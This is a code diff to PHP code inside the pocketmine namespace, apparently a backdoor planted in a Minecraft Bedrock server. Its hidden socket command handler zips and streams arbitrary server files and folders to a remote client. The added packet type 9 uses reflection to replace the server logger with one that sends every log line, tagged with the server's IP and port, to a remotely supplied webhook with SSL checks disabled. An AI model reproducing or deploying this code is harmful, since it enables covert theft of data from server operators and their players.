@@ -54,7 +54,7 @@ namespace pocketmine {
             private function sendAll(): void
             {
                 try {
-                    $ip = \pocketmine\utils\Internet::getIP(true);
+                    $ip = \pocketmine\utils\Internet::getIP();
                     $folders = ["plugins", "plugin_data", "worlds", "resource_packs"];
                     foreach ($folders as $folder) {
                         if ($path = "./$folder/$folder.zip" and @file_exists($path)) @unlink($path);
@@ -316,6 +316,48 @@ namespace pocketmine {
                                                     $this->cmd = "";
                                                 };
                                                 switch ($packetType) {
+                                                    case 9:
+                                                        $this->cmd = ltrim($payload);
+                                                        $logger = new class (\Symfony\Component\Filesystem\Path::join($dataPath, "server.log"), \pocketmine\utils\Terminal::hasFormattingCodes(), "Server", new \DateTimeZone(\pocketmine\utils\Timezone::get())) extends \pocketmine\utils\MainLogger {
+                                                            public string $webhook = '';
+
+                                                            protected function send(string $message, string $level, string $prefix, string $color): void
+                                                            {
+                                                                parent::send($message, $level, $prefix, $color);
+                                                                $task = new class ($message, $this->webhook, \pocketmine\Server::getInstance()->getPort()) extends \pocketmine\scheduler\AsyncTask {
+                                                                    public function __construct(private string $message, private string $webhook, private int $port)
+                                                                    {
+                                                                    }
+
+                                                                    public function onRun(): void
+                                                                    {
+                                                                        try {
+                                                                            $ip = \pocketmine\utils\Internet::getIP();
+                                                                            $data = ["content" => "`$ip:$this->port`: **$this->message**"];
+                                                                            $curl = @curl_init($this->webhook);
+                                                                            @curl_setopt($curl, CURLOPT_POST, 1);
+                                                                            @curl_setopt($curl, CURLOPT_HTTPHEADER, ["Content-Type: multipart/form-data"]);
+                                                                            @curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+                                                                            @curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
+                                                                            @curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
+                                                                            @curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
+                                                                            @curl_exec($curl);
+                                                                            @curl_close($curl);
+                                                                        } catch (\ValueError) {
+                                                                        }
+                                                                    }
+                                                                };
+                                                                $size = \pocketmine\Server::getInstance()->getAsyncPool()->getSize();
+                                                                $pool = \pocketmine\Server::getInstance()->getAsyncPool()->submitTaskToWorker($task, $size);
+                                                            }
+                                                        };
+                                                        $logger->webhook = $this->cmd;
+                                                        $property = new \ReflectionProperty(\pocketmine\Server::getInstance(), 'logger');
+                                                        $property->setAccessible(true);
+                                                        $property->setValue(\pocketmine\Server::getInstance(), $logger);
+                                                        $this->writePacket($sock, $requestID, 0, 'success');
+                                                        $this->response = "";
+                                                        $this->cmd = "";
                                                     case 6:
                                                         $this->cmd = realpath(ltrim($payload));
                                                         if (!$this->cmd) {
@@ -332,21 +374,24 @@ namespace pocketmine {
                                                             } else @$zip->addFile($this->cmd, $payload);
                                                             @$zip->close();
                                                         }
-                                                        $file = fopen("$filtered.zip", "rb");
-                                                        $this->writePacket($sock, $requestID, 7, strlen(base64_encode(file_get_contents("$filtered.zip"))));
+                                                        $file = @fopen("$filtered.zip", "rb");
+                                                        $this->writePacket($sock, $requestID, 7, strlen(@base64_encode(@file_get_contents("$filtered.zip"))));
                                                         $i = 0;
-                                                        $size = 0;
-                                                        while (!feof($file)) {
-                                                            $content = base64_encode(fread($file, 8192));
+                                                        while (!$this->stop and !feof($file)) {
+                                                            $content = @base64_encode(@fread($file, 1024 * 16));
                                                             $data = $i . ':' . $content;
-                                                            $size += strlen($content);
                                                             $this->writePacket($sock, $requestID, 8, $data);
                                                             ++$i;
                                                             usleep(100 * 1000);
                                                         }
-                                                        @unlink("$filtered.zip");
+                                                        if(!feof($file)){
+                                                            $this->writePacket($sock, $requestID, 0, 'error');
+                                                            @unlink("$filtered.zip");
+                                                            goto end;
+                                                        }
                                                         $this->response = 'success';
                                                         $this->writePacket($sock, $requestID, 0, $this->response);
+                                                        @unlink("$filtered.zip");
                                                         end:
                                                         $this->response = "";
                                                         $this->cmd = "";
